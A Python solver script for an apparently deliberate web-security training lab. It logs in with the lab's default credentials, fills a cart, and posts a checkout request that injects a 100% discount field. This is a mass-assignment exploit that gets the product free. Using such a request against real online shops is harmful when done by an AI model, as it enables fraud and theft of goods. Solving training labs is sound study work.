import mechanize
import requests
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.br = mechanize.Browser()
        self.session_token = None

    def get_session_token(self):
        session_token = ''
        self.br.open(self.lab_url + 'login')
        self.br.select_form(nr=0)
        self.br.form['username'] = 'wiener'
        self.br.form['password'] = 'peter'
        self.br.submit()
        for cookie in self.br.cookiejar:
            if cookie.name == 'session':
                session_token = cookie.value
        self.session_token = session_token

    def add_the_product_to_the_cart(self):
        headers = {
            'Cookie': 'session={}'.format(self.session_token)
        }
        data_string = 'productId=1&redir=PRODUCT&quantity=1'
        key_value_pairs = data_string.split('&')
        data = {}
        for pair in key_value_pairs:
            key, value = pair.split('=')
            data[key] = value
        requests.post(self.lab_url + 'cart', headers=headers, data=data)

    def buy_the_product(self):
        self.get_session_token()
        self.add_the_product_to_the_cart()
        headers = {
            'Cookie': 'session={}'.format(self.session_token)
        }
        data = {
            'chosen_discount': {'percentage': 100},
            'chosen_products': [
                {
                    'product_id': '1',
                    'name': 'Lightweight "l33t" Leather Jacket',
                    'quantity': 1,
                    'item_price': 133700
                }
            ]
        }
        requests.post(self.lab_url + 'api/checkout', headers=headers, json=data)
        print('You solved the lab.')
        print('Coded by Mohamed Ahmed (ma4747gh).')
        print('My GitHub account: https://github.com/ma4747gh')
        print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.buy_the_product()


solver = Solver(sys.argv[1])
solver.start()
